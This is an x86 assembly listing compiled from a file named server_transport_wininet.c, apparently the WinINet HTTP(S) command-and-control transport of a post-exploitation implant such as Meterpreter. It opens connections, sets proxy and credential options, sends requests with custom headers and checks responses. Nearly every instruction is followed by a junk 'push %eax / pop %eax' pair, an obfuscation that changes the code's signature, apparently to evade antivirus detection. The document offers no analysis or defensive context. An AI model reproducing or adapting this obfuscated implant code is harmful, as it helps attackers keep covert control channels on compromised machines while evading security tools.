	.file	"server_transport_wininet.c"
	.text
	.section .rdata,"dr"
LC0:
	.ascii "[%04x] \0"
LC1:
	.ascii "\15\12\0"
	.text
	.def	_real_dprintf;	.scl	3;	.type	32;	.endef
_real_dprintf:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%esi
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$1072, %esp
push %eax
pop %eax
	movl	__imp__GetCurrentThreadId@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 16(%esp)
push %eax
pop %eax
	movl	$LC0, 12(%esp)
push %eax
pop %eax
	movl	$1023, 8(%esp)
push %eax
pop %eax
	movl	$1024, 4(%esp)
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp___snprintf_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strlen
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	leal	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	-16(%ebp), %ecx
push %eax
pop %eax
	movl	$1021, %eax
push %eax
pop %eax
	subl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	$1024, %eax
push %eax
pop %eax
	subl	-12(%ebp), %eax
push %eax
pop %eax
	leal	-1040(%ebp), %esi
push %eax
pop %eax
	movl	-12(%ebp), %ebx
push %eax
pop %eax
	addl	%esi, %ebx
push %eax
pop %eax
	movl	%ecx, 16(%esp)
push %eax
pop %eax
	movl	8(%ebp), %ecx
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%ebx, (%esp)
push %eax
pop %eax
	call	_vsnprintf_s
push %eax
pop %eax
	movl	$LC1, 8(%esp)
push %eax
pop %eax
	movl	$1024, 4(%esp)
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__strcat_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__OutputDebugStringA@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	nop
push %eax
pop %eax
	leal	-8(%ebp), %esp
push %eax
pop %eax
	popl	%ebx
push %eax
pop %eax
	popl	%esi
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC2:
	.ascii "[%s] Setting secure request flag..\0"
	.align 4
LC3:
	.ascii "[%s] opening request on connection %x to %S\0"
	.align 2
LC4:
	.ascii "G\0E\0T\0\0\0"
	.align 2
LC5:
	.ascii "P\0O\0S\0T\0\0\0"
	.align 4
LC6:
	.ascii "[%s] Failed HttpOpenRequestW: %d\0"
	.align 4
LC7:
	.ascii "[%s] Setting secure option flags\0"
	.align 4
LC8:
	.ascii "[%s] Failed InternetSetOptionW: %d\0"
	.text
	.def	_get_request_wininet;	.scl	3;	.type	32;	.endef
_get_request_wininet:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$52, %esp
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$-2074082816, -12(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L3
push %eax
pop %eax
	orl	$8400896, -12(%ebp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC2, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L3:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	8(%eax), %eax
push %eax
pop %eax
	movl	%edx, 12(%esp)
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %edx
push %eax
pop %eax
	cmpl	$0, 12(%ebp)
push %eax
pop %eax
	je	L4
push %eax
pop %eax
	movl	$LC4, %ebx
push %eax
pop %eax
	jmp	L5
push %eax
pop %eax
L4:
	movl	$LC5, %ebx
push %eax
pop %eax
L5:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	8(%eax), %eax
push %eax
pop %eax
	movl	$0, 28(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %ecx
push %eax
pop %eax
	movl	%ecx, 24(%esp)
push %eax
pop %eax
	movl	$0, 20(%esp)
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%ebx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__HttpOpenRequestW@32, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$32, %esp
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	jne	L6
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC6, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$1168, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L7
push %eax
pop %eax
L6:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L8
push %eax
pop %eax
	movl	$13184, -20(%ebp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC7, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$4, 12(%esp)
push %eax
pop %eax
	leal	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$31, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__InternetSetOptionW@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L8
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC8, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$1168, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L7
push %eax
pop %eax
L8:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	jmp	L10
push %eax
pop %eax
L7:
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	je	L11
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__InternetCloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
L11:
	movl	$0, %eax
push %eax
pop %eax
L10:
	movl	-4(%ebp), %ebx
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_close_request_wininet;	.scl	3;	.type	32;	.endef
_close_request_wininet:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__InternetCloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_read_response_wininet;	.scl	3;	.type	32;	.endef
_read_response_wininet:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	movl	20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__InternetReadFile@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC9:
	.ascii "[WINHTTP] Sending with custom headers: %S\0"
	.text
	.def	_send_request_wininet;	.scl	3;	.type	32;	.endef
_send_request_wininet:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	44(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L17
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	44(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC9, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	44(%eax), %eax
push %eax
pop %eax
	movl	20(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 16(%esp)
push %eax
pop %eax
	movl	16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 12(%esp)
push %eax
pop %eax
	movl	$-1, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__HttpSendRequestW@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	jmp	L18
push %eax
pop %eax
L17:
	movl	20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 16(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__HttpSendRequestW@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
L18:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC10:
	.ascii "[PACKET RECEIVE WININET] Getting the result code...\0"
	.align 4
LC11:
	.ascii "[PACKET RECEIVE WININET] Returned status code is %d\0"
	.text
	.def	_validate_response_wininet;	.scl	3;	.type	32;	.endef
_validate_response_wininet:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$56, %esp
push %eax
pop %eax
	movl	$4, -16(%ebp)
push %eax
pop %eax
	movl	$LC10, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	leal	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	leal	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$536870931, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__HttpQueryInfoW@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L20
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC11, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	cmpl	$200, %eax
push %eax
pop %eax
	je	L20
push %eax
pop %eax
	movl	$1610, %eax
push %eax
pop %eax
	jmp	L22
push %eax
pop %eax
L20:
	movl	$0, %eax
push %eax
pop %eax
L22:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
LC12:
	.ascii "[WININET] Initialising ...\0"
	.align 4
LC13:
	.ascii "[DISPATCH] Configuring with proxy: %S\0"
	.align 4
LC14:
	.ascii "[DISPATCH] Failed InternetOpenW: %d\0"
	.align 4
LC15:
	.ascii "[DISPATCH] Configured hInternet: 0x%.8x\0"
	.align 4
LC16:
	.ascii "[DISPATCH] About to crack URL: %S\0"
LC17:
	.ascii "[DISPATCH] Configured URI: %S\0"
LC18:
	.ascii "[DISPATCH] Host: %S Port: %u\0"
	.align 4
LC19:
	.ascii "[DISPATCH] Failed InternetConnect: %d\0"
	.align 4
LC20:
	.ascii "[DISPATCH] Configured hConnection: 0x%.8x\0"
	.text
	.def	_server_init_wininet;	.scl	3;	.type	32;	.endef
_server_init_wininet:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$2152, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	48(%eax), %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	$LC12, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	32(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L24
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	32(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC13, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	32(%eax), %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	$3, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__InternetOpenW@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 4(%edx)
push %eax
pop %eax
	jmp	L25
push %eax
pop %eax
L24:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__InternetOpenW@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 4(%edx)
push %eax
pop %eax
L25:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L26
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC14, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	jmp	L32
push %eax
pop %eax
L26:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC15, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$1024, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	leal	-1096(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memset
push %eax
pop %eax
	movl	$1024, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	leal	-2120(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memset
push %eax
pop %eax
	movl	$60, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	leal	-72(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memset
push %eax
pop %eax
	movl	$60, -72(%ebp)
push %eax
pop %eax
	movl	$511, -52(%ebp)
push %eax
pop %eax
	leal	-1096(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -56(%ebp)
push %eax
pop %eax
	movl	$511, -24(%ebp)
push %eax
pop %eax
	leal	-2120(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	44(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC16, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	44(%eax), %eax
push %eax
pop %eax
	leal	-72(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 12(%esp)
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__InternetCrackUrlW@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L28
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	$0, 24(%eax)
push %eax
pop %eax
L28:
	leal	-2120(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp___wcsdup, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 24(%edx)
push %eax
pop %eax
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 64(%edx)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC17, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movzwl	-48(%ebp), %eax
push %eax
pop %eax
	movzwl	%ax, %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	leal	-1096(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC18, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movzwl	-48(%ebp), %eax
push %eax
pop %eax
	movzwl	%ax, %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	$0, 28(%esp)
push %eax
pop %eax
	movl	$0, 24(%esp)
push %eax
pop %eax
	movl	$3, 20(%esp)
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	leal	-1096(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__InternetConnectW@32, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$32, %esp
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 8(%edx)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	8(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L29
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC19, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	jmp	L32
push %eax
pop %eax
L29:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	32(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L30
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	36(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L31
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	36(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_wcslen
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	36(%edx), %ecx
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	8(%edx), %edx
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	%ecx, 8(%esp)
push %eax
pop %eax
	movl	$43, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	movl	__imp__InternetSetOptionW@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
L31:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	40(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L30
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	40(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_wcslen
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	40(%edx), %ecx
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	8(%edx), %edx
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	%ecx, 8(%esp)
push %eax
pop %eax
	movl	$44, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	movl	__imp__InternetSetOptionW@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
L30:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	8(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC20, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
L32:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_transport_move_to_wininet
	.def	_transport_move_to_wininet;	.scl	2;	.type	32;	.endef
_transport_move_to_wininet:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	48(%eax), %eax
push %eax
pop %eax
	movl	%eax, -4(%ebp)
push %eax
pop %eax
	movl	-4(%ebp), %eax
push %eax
pop %eax
	movl	$_get_request_wininet, 60(%eax)
push %eax
pop %eax
	movl	-4(%ebp), %eax
push %eax
pop %eax
	movl	$_send_request_wininet, 64(%eax)
push %eax
pop %eax
	movl	-4(%ebp), %eax
push %eax
pop %eax
	movl	$_close_request_wininet, 68(%eax)
push %eax
pop %eax
	movl	-4(%ebp), %eax
push %eax
pop %eax
	movl	$_validate_response_wininet, 72(%eax)
push %eax
pop %eax
	movl	-4(%ebp), %eax
push %eax
pop %eax
	movl	$0, 76(%eax)
push %eax
pop %eax
	movl	-4(%ebp), %eax
push %eax
pop %eax
	movl	$_read_response_wininet, 80(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	$_server_init_wininet, 20(%eax)
push %eax
pop %eax
	nop
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_strlen;	.scl	2;	.type	32;	.endef
	.def	_vsnprintf_s;	.scl	2;	.type	32;	.endef
	.def	_memset;	.scl	2;	.type	32;	.endef
	.def	_free;	.scl	2;	.type	32;	.endef
	.def	_current_unix_timestamp;	.scl	2;	.type	32;	.endef
	.def	_wcslen;	.scl	2;	.type	32;	.endef
